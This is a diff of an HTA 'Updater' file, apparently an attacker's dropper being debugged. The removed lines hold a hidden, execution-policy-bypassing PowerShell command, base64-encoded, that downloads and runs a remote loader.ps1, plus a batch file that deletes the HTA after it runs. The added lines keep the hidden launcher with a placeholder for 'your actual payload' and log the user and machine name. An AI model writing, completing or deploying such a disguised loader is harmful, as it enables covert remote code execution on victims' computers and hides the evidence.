@@ -16,44 +16,64 @@
   <title>Updater</title>
   <script language="VBScript">
     Sub Window_OnLoad()
-        Dim sh, psPath, psArgs, fso, htaPath
+        Dim sh, psPath, psArgs, fso, debugPath
         Set sh = CreateObject("WScript.Shell")
+        Set fso = CreateObject("Scripting.FileSystemObject")
         
+        ' Create debug log
+        debugPath = sh.ExpandEnvironmentStrings("%TEMP%\hta_debug.txt")
+        
+        ' Log execution context
+        Dim debugFile
+        Set debugFile = fso.CreateTextFile(debugPath, True)
+        debugFile.WriteLine "HTA Debug Log: " & Now()
+        debugFile.WriteLine "User: " & sh.ExpandEnvironmentStrings("%USERNAME%")
+        debugFile.WriteLine "ComputerName: " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+        debugFile.WriteLine "Temp: " & sh.ExpandEnvironmentStrings("%TEMP%")
+        debugFile.WriteLine "SystemRoot: " & sh.ExpandEnvironmentStrings("%SystemRoot%")
+        
+        ' Test PowerShell path
         psPath = sh.ExpandEnvironmentStrings("%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe")
-        psArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & _
-                 "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBvAG4AYwBlAG4AdAByAGEAdABlAGQAcwB1AGwAZgB1AHIAaQBjAGEAYwBpAGQALwB2AGUAYwB0AG8AcgAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
+        debugFile.WriteLine "PowerShell Path: " & psPath
+        debugFile.WriteLine "PowerShell Exists: " & fso.FileExists(psPath)
         
-        ' Launch PowerShell
+        ' Test simple PowerShell command first
+        Dim testCmd
+        testCmd = Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Add-Content -Path '" & debugPath & "' -Value 'PowerShell executed successfully'"""
+        debugFile.WriteLine "Test Command: " & testCmd
+        debugFile.Close
+        
+        ' Run test command
+        sh.Run testCmd, 0, True
+        
+        ' Wait then run your actual payload
+        setTimeout "RunPayload", 2000
+    End Sub
+    
+    Sub RunPayload()
+        Dim sh, psPath, psArgs, fso, debugPath
+        Set sh = CreateObject("WScript.Shell")
+        Set fso = CreateObject("Scripting.FileSystemObject")
+        
+        debugPath = sh.ExpandEnvironmentStrings("%TEMP%\hta_debug.txt")
+        psPath = sh.ExpandEnvironmentStrings("%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe")
+        psArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand <base-64 string>"
+        
+        ' Log payload execution
+        Dim debugFile
+        Set debugFile = fso.OpenTextFile(debugPath, 8, True)
+        debugFile.WriteLine "Executing payload: " & Now()
+        debugFile.WriteLine "Full command: " & Chr(34) & psPath & Chr(34) & " " & psArgs
+        debugFile.Close
+        
+        ' Execute your payload
         sh.Run Chr(34) & psPath & Chr(34) & " " & psArgs, 0, False
         
-        ' Delay before cleanup to ensure PowerShell starts
-        setTimeout "CleanupAndExit", 3000
+        ' Cleanup after delay
+        setTimeout "CleanupAndExit", 5000
     End Sub
     
     Sub CleanupAndExit()
-        Dim fso, htaPath
-        Set fso = CreateObject("Scripting.FileSystemObject")
-        htaPath = Replace(document.location.pathname, "/", "\")
-        If Left(htaPath, 1) = "\" Then htaPath = Mid(htaPath, 2)
-        
-        ' Create a batch file to delete the HTA after a delay
-        Dim batContent, batPath
-        batPath = fso.GetSpecialFolder(2) & "\cleanup.bat"
-        batContent = "@echo off" & vbCrLf & _
-                    "timeout /t 2 /nobreak >nul" & vbCrLf & _
-                    "del """ & htaPath & """ >nul 2>&1" & vbCrLf & _
-                    "del """ & batPath & """ >nul 2>&1"
-        
-        Dim batFile
-        Set batFile = fso.CreateTextFile(batPath, True)
-        batFile.Write batContent
-        batFile.Close
-        
-        ' Run cleanup batch hidden
-        Dim sh
-        Set sh = CreateObject("WScript.Shell")
-        sh.Run Chr(34) & batPath & Chr(34), 0, False
-        
         self.close
     End Sub
   </script>
